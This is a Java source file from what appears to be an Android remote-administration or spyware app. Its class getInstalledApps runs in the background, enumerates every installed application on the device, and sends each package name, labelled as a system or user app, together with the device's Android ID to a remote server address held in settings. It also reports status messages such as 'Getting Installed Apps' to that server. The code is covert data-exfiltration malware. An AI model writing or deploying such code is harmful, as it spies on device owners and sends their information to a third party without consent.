package u.can.i.up.expert.utils;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;
import java.util.List;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class getInstalledApps extends AsyncTask<String, Void, String> {
    String j = "";
    public getInstalledApps(String j) {
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {
        final PackageManager packageManager = DataSet.getInstance().myService.getApplicationContext().getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        int i = 0;
        for (ApplicationInfo appInfo : installedApplications)
        {
            if(i<Integer.parseInt(j))
            {
                if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0)
                {
                    try {
                        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "[SystemApp] " + appInfo.packageName);
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }
                }
                else
                {
                    try {
                        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "[UserApp] " + appInfo.packageName);
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }
                }
            }
            i++;
        }

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",false).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Installed Apps Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Get",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Installed Apps");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
